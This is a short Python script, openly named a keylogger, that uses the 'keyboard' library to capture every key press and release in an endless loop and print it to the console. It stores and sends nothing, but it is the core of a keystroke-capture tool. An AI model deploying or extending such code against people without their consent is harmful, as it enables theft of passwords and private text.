import keyboard

def keylogger():
    while True:
        event = keyboard.read_event()
        print(f"Key: {event.name} | Action: {event.event_type}")

keylogger()
